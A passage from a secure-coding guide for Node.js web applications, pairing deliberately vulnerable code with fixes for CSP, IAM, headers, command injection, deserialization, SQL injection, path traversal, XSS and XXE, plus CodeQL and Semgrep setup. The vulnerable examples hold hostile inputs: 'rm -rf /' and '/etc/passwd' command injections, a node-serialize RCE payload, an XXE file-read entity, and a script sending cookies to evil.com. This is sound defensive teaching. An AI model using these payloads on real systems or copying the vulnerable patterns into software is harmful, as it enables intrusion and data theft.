// authz.suspicious (unexpected role escalation attempt)
// user.created / deleted / role_changed
// secret.accessed (for sensitive operations)
```

Forward security logs to a centralized SIEM (Splunk, Elastic, Datadog). Set alerts for: >10 failed logins from one IP in 5 min, login from new country, privilege escalation, off-hours admin access.

Reference: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## 7. Infrastructure & HTTP Hardening {#section-7}

**Impact:** MEDIUM
**Description:** Security headers, Content Security Policy, and least-privilege IAM roles provide defense-in-depth (OWASP A02) that limits the blast radius of other vulnerabilities.

## Implement a Strict Content Security Policy (CSP)

**Impact: MEDIUM — CWE-79**

A Content Security Policy is the strongest browser-side XSS mitigation. Even if an attacker injects a script, CSP prevents it from executing unless it comes from an approved source. A strict nonce-based or hash-based CSP blocks inline scripts and `eval`, eliminating most XSS impact.

**Vulnerable (no CSP or permissive CSP):**

```typescript
// ❌ No CSP header at all — any injected script executes
app.get('/', (req, res) => {
  res.send('<html>...</html>')
})

// ❌ Wildcard CSP — effectively useless
// Content-Security-Policy: script-src *
// Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval'
```

**Secure (nonce-based strict CSP):**

```typescript
import { randomBytes } from 'crypto'
import helmet from 'helmet'

// ✅ Nonce-based CSP — unique nonce per request
app.use((req, res, next) => {
  res.locals.cspNonce = randomBytes(16).toString('base64')
  next()
})

app.use((req, res, next) => {
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc:     ["'none'"],
      scriptSrc:      ["'self'", `'nonce-${res.locals.cspNonce}'`],
      styleSrc:       ["'self'", `'nonce-${res.locals.cspNonce}'`],
      imgSrc:         ["'self'", 'data:', 'https://cdn.example.com'],
      fontSrc:        ["'self'", 'https://fonts.gstatic.com'],
      connectSrc:     ["'self'", 'https://api.example.com'],
      frameSrc:       ["'none'"],
      objectSrc:      ["'none'"],
      baseUri:        ["'self'"],
      formAction:     ["'self'"],
      upgradeInsecureRequests: [],
      reportUri:      ['/api/csp-report'],  // log violations
    },
  })(req, res, next)
})

// ✅ Use the nonce in templates
// <script nonce="<%= nonce %>">...</script>

// ✅ Next.js nonce-based CSP
// middleware.ts
import { NextResponse } from 'next/server'
import { randomBytes } from 'crypto'

export function middleware(request: Request) {
  const nonce = randomBytes(16).toString('base64')
  const csp = [
    `default-src 'none'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data:`,
    `connect-src 'self'`,
    `frame-ancestors 'none'`,
  ].join('; ')

  const response = NextResponse.next()
  response.headers.set('Content-Security-Policy', csp)
  response.headers.set('x-nonce', nonce)
  return response
}

// ✅ Log CSP violations for monitoring
app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  logger.warn({ event: 'csp.violation', report: req.body['csp-report'] })
  res.status(204).end()
})
```

Start with `Content-Security-Policy-Report-Only` to collect violations without blocking. Iterate until violations drop, then switch to enforcing mode. Avoid `'unsafe-inline'` and `'unsafe-eval'` — they negate most XSS protection.

Reference: [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

---

## Apply Least Privilege to Service Accounts and IAM Roles

**Impact: MEDIUM — CWE-250**

Overly permissive IAM roles and service accounts amplify the blast radius of any compromise. If a Lambda function is compromised and has `AdministratorAccess`, the attacker owns your entire AWS account. Scope every role to only the specific actions and resources it actually uses.

**Vulnerable (overly permissive IAM):**

```json
// ❌ Lambda execution role with full admin — one compromise = full account takeover
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}

// ❌ App connects to DB with root credentials
// DATABASE_URL=postgresql://root:password@db.example.com/mydb
// Root can DROP TABLE, CREATE USER, GRANT — far more than app needs
```

**Secure (minimal permission policy scoped to exact resources):**

```json
// ✅ Lambda role — only the S3 bucket and operations it needs
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-app-uploads/*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "secretsmanager:GetSecretValue"
      ],
      "Resource": "arn:aws:secretsmanager:us-east-1:123456789:secret:prod/myapp/*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:log-group:/aws/lambda/my-function:*"
    }
  ]
}
```

```sql
-- ✅ DB user with only the permissions the app needs
CREATE USER app_user WITH PASSWORD 'secure_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_user;
-- NOT GRANTED: DROP, CREATE TABLE, ALTER, TRUNCATE, pg_read_file

-- ✅ Read-only user for analytics/reporting
CREATE USER analytics_user WITH PASSWORD 'secure_password';
GRANT SELECT ON ALL TABLES IN SCHEMA public TO analytics_user;
```

```typescript
// ✅ Use environment-specific roles
// Development: ReadOnly access to dev resources
// Staging: Write access to staging resources only
// Production: Write access to prod, never cross-account

// ✅ Rotate service account credentials regularly
// Use IAM roles (not access keys) wherever possible — no key rotation needed
```

Review IAM policies with AWS IAM Access Analyzer or similar tools. Enable CloudTrail for all API calls. Alert on `iam:CreateUser`, `iam:AttachRolePolicy`, and `s3:PutBucketPolicy` events.

Reference: [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)

---

## Set All Critical Security HTTP Headers

**Impact: MEDIUM — CWE-693**

Missing security headers leave browsers without important defense-in-depth protections. Headers like `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy` prevent clickjacking, MIME sniffing, and information leakage. Use the `helmet` middleware to set all recommended headers in a single line.

**Vulnerable (no security headers):**

```typescript
// ❌ No security headers — browser uses defaults that are permissive
const app = express()
app.use(express.json())
// Missing: X-Frame-Options, X-Content-Type-Options, Referrer-Policy, HSTS, etc.
```

**Secure (all headers set with helmet):**

```typescript
import helmet from 'helmet'
import express from 'express'

const app = express()

// ✅ Helmet sets all recommended headers with secure defaults
app.use(helmet())
// Sets: X-Frame-Options: SAMEORIGIN
//       X-Content-Type-Options: nosniff
//       X-XSS-Protection: 0 (modern approach — rely on CSP)
//       Referrer-Policy: no-referrer
//       Strict-Transport-Security: max-age=15552000; includeSubDomains
//       Permissions-Policy: (limits camera, mic, geolocation)
//       Cross-Origin-Embedder-Policy: require-corp
//       Cross-Origin-Opener-Policy: same-origin
//       Cross-Origin-Resource-Policy: same-origin

// ✅ Custom configuration for specific needs
app.use(helmet({
  frameguard:          { action: 'deny' },              // block all framing (stricter than SAMEORIGIN)
  hsts:                { maxAge: 63072000, includeSubDomains: true, preload: true },
  referrerPolicy:      { policy: 'strict-origin-when-cross-origin' },
  contentSecurityPolicy: false,  // configure CSP separately (see infra-csp rule)
}))

// ✅ Verify your headers at:
// https://securityheaders.com
// https://observatory.mozilla.org

// ✅ For Next.js — set in next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          { key: 'X-Frame-Options',         value: 'DENY' },
          { key: 'X-Content-Type-Options',  value: 'nosniff' },
          { key: 'Referrer-Policy',         value: 'strict-origin-when-cross-origin' },
          { key: 'Permissions-Policy',      value: 'camera=(), microphone=(), geolocation=()' },
        ],
      },
    ]
  },
}
```

| Header | Purpose |
|---|---|
| `X-Frame-Options: DENY` | Prevents clickjacking via iframes |
| `X-Content-Type-Options: nosniff` | Prevents MIME type confusion attacks |
| `Referrer-Policy: strict-origin` | Limits URL leakage in Referer header |
| `Permissions-Policy` | Restricts browser feature access (camera, mic) |
| `HSTS` | Enforces HTTPS at the browser level |
| `X-XSS-Protection: 0` | Disables legacy XSS auditor (modern browsers use CSP) |

Reference: [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)

---

## 8. Input Validation & Injection Prevention {#section-8}

**Impact:** CRITICAL
**Description:** Injection vulnerabilities (SQL, command, XSS, XXE, deserialization, mass assignment) remain the most exploited class of flaws (OWASP A05). All untrusted data must be validated, sanitized, and escaped before use.

## Never Construct Shell Commands from User Input

**Impact: CRITICAL — CWE-78**

OS command injection lets attackers execute arbitrary commands on the server with the application's privileges. Any use of `exec`, `execSync`, or shell-interpolating functions with user-controlled data is exploitable. Use `spawn` with an argument array instead, which never invokes a shell.

**Vulnerable (shell command injection):**

```typescript
import { exec, execSync } from 'child_process'

// ❌ Attacker sends: filename='; rm -rf /; echo '
exec(`convert /uploads/${req.body.filename} output.jpg`, callback)

// ❌ execSync with template literal
const result = execSync(`ping ${req.query.host}`)
// ?host=8.8.8.8; cat /etc/passwd

// ❌ Shell option enabled — still dangerous
const { exec } = require('child_process')
exec('ls ' + userInput, { shell: true }, callback)
```

**Secure (spawn with arg array — no shell invocation):**

```typescript
import { spawn } from 'child_process'
import path from 'path'

// ✅ spawn with array of arguments — never interpreted as shell commands
function convertImage(filename: string): Promise<string> {
  // Validate the filename first
  if (!/^[a-zA-Z0-9_\-]+\.(jpg|png|gif|webp)$/.test(filename)) {
    throw new Error('Invalid filename')
  }

  const inputPath  = path.resolve('/uploads', filename)
  const outputPath = path.resolve('/processed', `${Date.now()}.jpg`)

  return new Promise((resolve, reject) => {
    const proc = spawn('convert', [inputPath, outputPath], {
      shell: false,  // ✅ explicitly disable shell
      timeout: 10000,
    })
    proc.on('close', code => {
      if (code !== 0) reject(new Error(`convert exited with ${code}`))
      else resolve(outputPath)
    })
  })
}

// ✅ For ping — allowlist hosts, use spawn
function ping(host: string) {
  const allowedHosts = ['8.8.8.8', '1.1.1.1', '8.8.4.4']
  if (!allowedHosts.includes(host)) throw new Error('Host not allowed')

  return spawn('ping', ['-c', '4', host], { shell: false })
}
```

If you need shell features (pipes, redirects), use them in static scripts and pass only validated data as arguments. Never allow user input to reach the shell command string itself.

Reference: [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## Avoid Unsafe Deserialization of Untrusted Data

**Impact: CRITICAL — CWE-502**

Unsafe deserialization converts attacker-controlled bytes or strings into live objects, potentially executing arbitrary code, escalating privileges, or corrupting application state. In JavaScript/Node.js, this manifests as prototype pollution via `JSON.parse` of unvalidated input, `eval`-based deserializers, or libraries like `node-serialize` that execute functions during deserialization. In Java, `ObjectInputStream` on untrusted data has caused some of the most severe RCE vulnerabilities in history.

**Vulnerable (unsafe deserialization):**

```typescript
// ❌ node-serialize executes functions embedded in serialized data
import { unserialize } from 'node-serialize'

app.post('/api/session', (req, res) => {
  // Attacker sends: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /')}()"}
  const session = unserialize(req.body.data)
  res.json(session)
})

// ❌ eval-based deserialization
function parseConfig(raw: string): Config {
  return eval('(' + raw + ')')  // Executes arbitrary code!
}

// ❌ Unvalidated JSON.parse — prototype pollution
const userInput = JSON.parse(body)
// If body = '{"__proto__":{"isAdmin":true}}', every object now has isAdmin=true
Object.assign(defaults, userInput)
```

**Secure (safe deserialization with validation):**

```typescript
import { z } from 'zod'

// ✅ Parse JSON then immediately validate against a strict schema
const SessionSchema = z.object({
  userId: z.string().uuid(),
  role: z.enum(['user', 'admin']),
  expiresAt: z.string().datetime(),
})

app.post('/api/session', (req, res) => {
  const parsed = SessionSchema.safeParse(req.body)
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid session data' })
  }
  // parsed.data is typed and validated — no extra properties
  res.json(parsed.data)
})

// ✅ Prevent prototype pollution with Object.create(null) or explicit property checks
function safeMerge(target: Record<string, unknown>, source: Record<string, unknown>) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue  // Block prototype pollution vectors
    }
    target[key] = source[key]
  }
  return target
}
```

Never use `eval`, `Function()`, `node-serialize`, or `vm.runInNewContext` on untrusted input. Always validate deserialized data against a strict schema with an explicit allowlist of expected fields.

Reference: [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

## Prevent Mass Assignment by Using Explicit Field Allowlists

**Impact: HIGH — CWE-915**

Mass assignment occurs when an application directly binds user input to model objects without filtering. An attacker can inject extra fields in the request body — like `role: "admin"`, `price: 0`, or `isVerified: true` — that the ORM dutifully writes to the database. This is a direct path to privilege escalation, financial fraud, and data corruption. Always use explicit allowlists of updatable fields.

**Vulnerable (direct binding of request body to model):**

```typescript
// ❌ Spreading the entire request body into the database update
app.put('/api/users/:id', async (req, res) => {
  // Attacker sends: { name: "Legit", role: "admin", isVerified: true }
  // ORM writes ALL fields, including role and isVerified
  const user = await db.users.update(req.params.id, req.body)
  res.json(user)
})

// ❌ Sequelize: passing req.body directly to create
app.post('/api/products', async (req, res) => {
  // Attacker sends: { name: "Widget", price: 0, sellerId: "other-user-id" }
  const product = await Product.create(req.body)  // Creates product with price=0
  res.json(product)
})

// ❌ Mongoose: no field filtering
app.patch('/api/settings', async (req, res) => {
  // Attacker sends: { theme: "dark", creditBalance: 99999 }
  await Settings.findByIdAndUpdate(req.user.settingsId, req.body)
  res.json({ success: true })
})
```

**Secure (explicit field allowlists):**

```typescript
import { z } from 'zod'

// ✅ Define exactly which fields the user can update
const UpdateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  avatar: z.string().url().optional(),
  // role, isVerified, isAdmin are NOT in the schema — silently stripped
})

app.put('/api/users/:id', async (req, res) => {
  // Zod strips all fields not in the schema
  const data = UpdateUserSchema.parse(req.body)
  // data = { name: "Legit", email: "user@example.com" }
  // role, isVerified, and any injected fields are gone
  const user = await db.users.update(req.params.id, data)
  res.json(user)
})

// ✅ Alternative: pick specific fields explicitly
app.patch('/api/settings', async (req, res) => {
  const allowedFields = ['theme', 'language', 'timezone', 'notifications'] as const
  const safeUpdate: Record<string, unknown> = {}

  for (const field of allowedFields) {
    if (req.body[field] !== undefined) {
      safeUpdate[field] = req.body[field]
    }
  }

  await Settings.findByIdAndUpdate(req.user.settingsId, safeUpdate)
  res.json({ success: true })
})
```

Never pass `req.body` directly to ORM `.create()`, `.update()`, or `.findByIdAndUpdate()`. Always filter through a schema (Zod, Joi) or an explicit allowlist of permitted fields. Define separate schemas for creation vs. update to prevent field escalation.

Reference: [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---

## Use Parameterized Queries to Prevent SQL Injection

**Impact: CRITICAL — CWE-89**

SQL injection is the most exploited injection vulnerability. Concatenating user input into SQL strings allows attackers to read any table, bypass authentication, delete data, or execute OS commands via `xp_cmdshell`. Always use parameterized queries or an ORM that handles escaping.

**Vulnerable (string concatenation):**

```typescript
// ❌ Classic SQL injection — attacker enters: ' OR '1'='1
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`
const user = await db.raw(query)

// ❌ Still injectable — template literals don't escape
const id = req.params.id
const result = await db.raw(`SELECT * FROM orders WHERE user_id = ${id}`)

// ❌ ORM bypass — using raw() with interpolation
const name = req.query.name
await db.raw(`UPDATE products SET name = '${name}' WHERE id = ?`, [id])
```

**Secure (parameterized queries and ORM):**

```typescript
// ✅ Parameterized query — values never interpreted as SQL
const user = await db.raw(
  'SELECT * FROM users WHERE email = ?',
  [req.body.email]
)

// ✅ ORM (Prisma) — always parameterized
const user = await prisma.user.findFirst({
  where: { email: req.body.email }
})

// ✅ ORM (TypeORM) — use parameter binding
const user = await userRepo.findOne({
  where: { email: req.body.email }
})

// ✅ If raw queries are needed, always bind
const result = await db.raw(
  'SELECT * FROM orders WHERE user_id = ? AND status = ?',
  [req.user.id, req.query.status]
)

// ✅ Drizzle ORM — typed and safe
const result = await db.select()
  .from(orders)
  .where(eq(orders.userId, req.user.id))
```

If you must use dynamic column/table names (for sorting), use a strict allowlist — never interpolate directly. Validate that sort fields match a fixed set: `if (!['name', 'email'].includes(sortBy)) throw new Error('Invalid sort field')`.

Reference: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

## Prevent Path Traversal by Validating File Paths

**Impact: CRITICAL — CWE-22**

Path traversal attacks use `../` sequences in filenames to escape the intended directory and read arbitrary files (`/etc/passwd`, `.env`, private keys). Never construct file paths from user input without resolving and verifying they remain within the expected directory.

**Vulnerable (unsanitized path from user input):**

```typescript
// ❌ Attacker sends: filename=../../.env
app.get('/files/:filename', (req, res) => {
  const filePath = path.join('/uploads', req.params.filename)
  res.sendFile(filePath)
  // resolves to: /uploads/../../.env → /.env
})

// ❌ URL-encoded traversal — %2F..%2F..%2Fetc%2Fpasswd
app.get('/static', (req, res) => {
  const file = path.join('./public', req.query.file as string)
  res.sendFile(file)
})
```

**Secure (resolve and verify prefix):**

```typescript
import path from 'path'
import fs from 'fs'

const UPLOAD_DIR = path.resolve('/app/uploads')

// ✅ Resolve full path, then verify it starts with the allowed directory
app.get('/files/:filename', (req, res) => {
  const requestedPath = path.resolve(UPLOAD_DIR, req.params.filename)

  // Prevent traversal — resolved path must be inside UPLOAD_DIR
  if (!requestedPath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Forbidden' })
  }

  if (!fs.existsSync(requestedPath)) {
    return res.status(404).json({ error: 'Not found' })
  }

  res.sendFile(requestedPath)
})

// ✅ Use an allowlist of file IDs instead of filenames
app.get('/files/:fileId', requireAuth, async (req, res) => {
  const file = await db.files.findFirst({
    where: { id: req.params.fileId, ownerId: req.user.id }
  })
  if (!file) return res.status(404).json({ error: 'Not found' })
  res.sendFile(path.resolve(UPLOAD_DIR, file.storedName))
})
```

Prefer the allowlist approach: store files with server-generated names (UUIDs) and look up the real path from the database. This eliminates the need for path validation entirely.

Reference: [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

## Validate and Sanitize All Input Server-Side

**Impact: CRITICAL — CWE-20**

Client-side validation is a UX convenience, not a security control. Attackers bypass it trivially with curl or browser DevTools. All data from HTTP requests (body, query, params, headers) must be validated and typed server-side before use. Use a schema validation library — manual checks miss edge cases.

**Vulnerable (trusting client input):**

```typescript
// ❌ Using req.body directly — no type or shape validation
app.post('/api/users', async (req, res) => {
  const { email, age, role } = req.body
  // attacker can send: { role: 'admin', age: -1, email: null }
  await db.users.create({ email, age, role })
})

// ❌ No range or type check on numeric params
app.get('/api/items', async (req, res) => {
  const limit = req.query.limit  // string, could be 'DROP TABLE users'
  const items = await db.items.findMany({ take: limit })
})
```

**Secure (schema validation with Zod):**

```typescript
import { z } from 'zod'

// ✅ Define schema — explicit shape, types, ranges, and safe defaults
const CreateUserSchema = z.object({
  email:    z.string().email().max(254),
  age:      z.number().int().min(0).max(150),
  username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/),
  // role is NOT accepted from client — set server-side
})

app.post('/api/users', async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ errors: result.error.flatten() })
  }
  const { email, age, username } = result.data
  await db.users.create({ email, age, username, role: 'user' }) // role set by server
})

// ✅ Query params with safe coercion and limits
const ListSchema = z.object({
  limit:  z.coerce.number().int().min(1).max(100).default(20),
  offset: z.coerce.number().int().min(0).default(0),
  search: z.string().max(100).optional(),
})

app.get('/api/items', async (req, res) => {
  const { limit, offset, search } = ListSchema.parse(req.query)
  const items = await db.items.findMany({ take: limit, skip: offset })
  res.json(items)
})
```

Never trust fields like `role`, `isAdmin`, `price`, or `userId` from the client. Derive privilege and ownership from the authenticated session, not from request data.

Reference: [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

---

## Disable External Entity Processing in XML Parsers (XXE)

**Impact: CRITICAL — CWE-611**

XML eXternal Entity (XXE) attacks exploit insecure XML parsers to read local files (`/etc/passwd`, `.env`), perform SSRF to internal services, or cause denial of service. By default, many XML parsers allow external entity resolution. Disable it explicitly.

**Vulnerable (default XML parser config):**

```typescript
// ❌ node-expat, libxmljs — external entities enabled by default
import libxmljs from 'libxmljs'
const doc = libxmljs.parseXml(req.body)  // external entities resolved!

// ❌ SAML/XML libraries that don't disable DTD
import { parseString } from 'xml2js'
parseString(req.body, callback)  // check if noent: false is needed

// Example malicious payload:
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <data>&xxe;</data>
```

**Secure (disable external entities and DTD processing):**

```typescript
// ✅ Use fast-xml-parser — no DTD support by design
import { XMLParser } from 'fast-xml-parser'

const parser = new XMLParser({
  allowBooleanAttributes: true,
})
const result = parser.parse(req.body)

// ✅ xml2js — disable entity expansion
import { parseStringPromise } from 'xml2js'
const result = await parseStringPromise(req.body, {
  explicitArray: false,
  // xml2js uses sax.js internally which doesn't process external entities
})

// ✅ For SAML libraries — verify XXE is disabled in the library config
// Use xmldom with external entities disabled:
import { DOMParser } from '@xmldom/xmldom'
const parser = new DOMParser({
  errorHandler: {
    warning: () => {},
    error: (msg: string) => { throw new Error(msg) },
    fatalError: (msg: string) => { throw new Error(msg) },
  },
})
const doc = parser.parseFromString(xml, 'text/xml')

// ✅ If you control schema — reject XML with DOCTYPE entirely
function stripDoctype(xml: string): string {
  if (/<!DOCTYPE/i.test(xml)) {
    throw new Error('DOCTYPE is not allowed')
  }
  return xml
}
const safeXml = stripDoctype(req.body)
```

Prefer JSON over XML for APIs where you control both sides. When XML is required, use libraries with no DTD/entity support by design and validate input size to prevent billion-laughs DoS.

Reference: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

## Escape All Output Rendered as HTML to Prevent XSS

**Impact: CRITICAL — CWE-79**

Cross-site scripting (XSS) allows attackers to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.

**Vulnerable (unescaped user data in HTML):**

```typescript
// ❌ Direct innerHTML — executes attacker's script
document.getElementById('name').innerHTML = user.name
// user.name = '<script>fetch("evil.com?c="+document.cookie)</script>'

// ❌ dangerouslySetInnerHTML without sanitization
function Comment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />
}

// ❌ Server-side template injection
app.get('/hello', (req, res) => {
  res.send(`<h1>Hello ${req.query.name}</h1>`)
  // ?name=<script>alert(1)</script>
})
```

**Secure (context-aware encoding):**

```typescript
// ✅ React auto-escapes JSX expressions — use text content
function UserName({ name }: { name: string }) {
  return <span>{name}</span>  // safe — React escapes by default
}

// ✅ If HTML rendering is required, sanitize with DOMPurify
import DOMPurify from 'dompurify'

function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target'],
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ✅ Server-side: use a template engine that auto-escapes (Handlebars, Nunjucks)
// or escape manually
import { escape } from 'html-escaper'
app.get('/hello', (req, res) => {
  const name = escape(req.query.name as string)
  res.send(`<h1>Hello ${name}</h1>`)
})

// ✅ Use textContent, not innerHTML for DOM updates
element.textContent = userInput  // safe
// element.innerHTML = userInput  ❌ unsafe
```

React's JSX auto-escapes text content — but `dangerouslySetInnerHTML` bypasses this. Use DOMPurify when rich HTML is required. Combine with a strict Content Security Policy (`infra-csp`) to limit XSS impact.

Reference: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

## 9. Static Application Security Testing & Code Analysis {#section-9}

**Impact:** HIGH
**Description:** SAST tools (SonarQube, Semgrep, CodeQL) analyse source code for security flaws without executing it. They catch injection patterns, hardcoded secrets, insecure APIs, and code quality issues before code reaches production. Integrate in CI and as pre-merge gates.

## Enable GitHub CodeQL for Automated Vulnerability Discovery

**Impact: HIGH — CWE-1006**

CodeQL is GitHub's semantic code analysis engine that builds a queryable database of your code and finds vulnerabilities through **dataflow analysis** — tracking untrusted input from sources (HTTP request, env vars, user input) through your code to dangerous sinks (SQL queries, HTML output, shell commands). Unlike pattern-matching tools, CodeQL understands code semantics and catches vulnerabilities across function call chains. It is free for open-source repositories and included in GitHub Advanced Security for private repos.

**Vulnerable (code that CodeQL's dataflow analysis catches):**

```typescript
// ❌ CodeQL: js/sql-injection — tracks req.query.id → db.query
app.get('/user', async (req, res) => {
  const id = req.query.id                        // Source: HTTP input
  const user = await db.raw(`SELECT * FROM users WHERE id = ${id}`)  // Sink: SQL query
  res.json(user)
})

// ❌ CodeQL: js/reflected-xss — tracks req.query.name → res.send
app.get('/hello', (req, res) => {
  const name = req.query.name                    // Source: HTTP input
  res.send(`<h1>Hello ${name}</h1>`)             // Sink: HTML response
})

// ❌ CodeQL: js/path-injection — tracks req.params.file → readFileSync
app.get('/download', (req, res) => {
  const file = req.params.filename               // Source: HTTP input
  const content = fs.readFileSync('./files/' + file)  // Sink: file system
  res.send(content)
})
```

**Secure (CodeQL enabled as a blocking PR check):**

```yaml
# ✅ .github/workflows/codeql.yml — recommended setup
name: CodeQL Security Analysis
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
  schedule:
    - cron: '0 6 * * 1'  # Weekly full scan on Monday 6am

jobs:
  codeql:
    name: CodeQL Analysis
    runs-on: ubuntu-latest
    permissions:
      actions:         read
      contents:        read
      security-events: write   # required to upload SARIF results

    strategy:
      fail-fast: false
      matrix:
        language: [javascript-typescript]
        # Add: python, java, csharp, go, ruby as needed

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          # ✅ Use security-extended for broader coverage (includes experimental queries)
          queries: security-extended
          # queries: security-and-quality  # even more rules

      - name: Setup Node.js (for autobuild)
        uses: actions/setup-node@v4
        with:
          node-version: 22

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3
        # Or replace with manual build steps for complex projects:
        # - run: npm ci && npm run build

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          category: "/language:${{ matrix.language }}"
          upload: true            # uploads SARIF to GitHub Security tab
          # Results appear in: Security → Code scanning alerts
```

```yaml
# ✅ Make CodeQL a required PR check (branch protection)
# Settings → Branches → main → Require status checks:
# ✓ "CodeQL Analysis (javascript-typescript)"
# This blocks merges until CodeQL passes
```

```javascript
// ✅ Custom CodeQL query — find all Express routes missing auth middleware
// .github/codeql/custom-queries/missing-auth.ql

/**
 * @name Express route missing authentication middleware
 * @description Finds Express route handlers that don't include an auth check
 * @kind problem
 * @problem.severity warning
 * @id js/express-missing-auth
 * @tags security
 */

import javascript
import semmle.javascript.frameworks.Express

from Express::RouteHandler handler
where
  not exists(Express::RouteSetup setup |
    setup.getARouteHandler() = handler and
    setup.getARouteHandler() instanceof AuthMiddleware
  ) and
  handler.getFile().getRelativePath().matches("src/routes/%")
select handler, "Express route handler may be missing authentication middleware"
```

```bash
# ✅ Run CodeQL locally with the CLI
# Install: https://github.com/github/codeql-action/releases
codeql pack download codeql/javascript-queries

# Create database
codeql database create ./codeql-db --language=javascript-typescript --source-root=./src

# Run security-extended queries
codeql database analyze ./codeql-db \
  codeql/javascript-queries:codeql-suites/javascript-security-extended.qls \
  --format=sarif-latest \
  --output=results.sarif

# View results
codeql database analyze ./codeql-db \
  codeql/javascript-queries:codeql-suites/javascript-security-extended.qls \
  --format=csv \
  --output=results.csv
cat results.csv
```

| CodeQL Suite | Coverage |
|---|---|
| `security-extended` | OWASP Top 10 + experimental high-confidence queries |
| `security-and-quality` | All security + code quality rules |
| `security-experimental` | Cutting-edge, higher false-positive rate |

Use `security-extended` for PR gates. Review all HIGH/CRITICAL alerts before marking as dismissed — GitHub tracks dismissal reasons and audits them.

Reference: [CodeQL Documentation](https://codeql.github.com/docs/) | [GitHub Code Scanning](https://docs.github.com/en/code-security/code-scanning)

---

## Use Semgrep for Custom Security Rule Enforcement

**Impact: HIGH — CWE-1006**

Semgrep is a lightweight, fast SAST tool that finds bugs and security issues using pattern-matching rules. Unlike SonarQube (which is heavy and general), Semgrep excels at **custom org-specific rules**: enforce that every `db.query()` call uses parameterized queries, that `jwt.verify()` always specifies an algorithm, that `res.send()` never interpolates user input, and so on. Run in CI and as a pre-commit hook.

**Vulnerable (patterns Semgrep would catch and block):**

```typescript
// ❌ Semgrep rule: ban-string-concat-sql
const user = await db.query("SELECT * FROM users WHERE id = " + req.params.id)

// ❌ Semgrep rule: require-jwt-algorithm
const decoded = jwt.verify(token, secret)  // no algorithm specified

// ❌ Semgrep rule: ban-eval
const result = eval(userInput)

// ❌ Semgrep rule: ban-dangerously-set-inner-html-raw
<div dangerouslySetInnerHTML={{ __html: content }} />

// ❌ Semgrep rule: no-math-random-for-crypto
const token = Math.random().toString(36)  // not cryptographically secure
```

**Secure (Semgrep rules enforcing org security patterns):**

```yaml
# ✅ .semgrep/security.yml — custom org rules
rules:
  # Ban string-concatenated SQL queries
  - id: ban-string-concat-sql
    patterns:
      - pattern: $DB.query("..." + ...)
      - pattern: $DB.query(`...${...}...`)
    message: "SQL string concatenation detected. Use parameterized queries: db.query('...', [params])"
    languages: [typescript, javascript]
    severity: ERROR
    metadata:
      cwe: "CWE-89"
      owasp: "A03:2021"

  # Require algorithm option in jwt.verify
  - id: require-jwt-algorithm
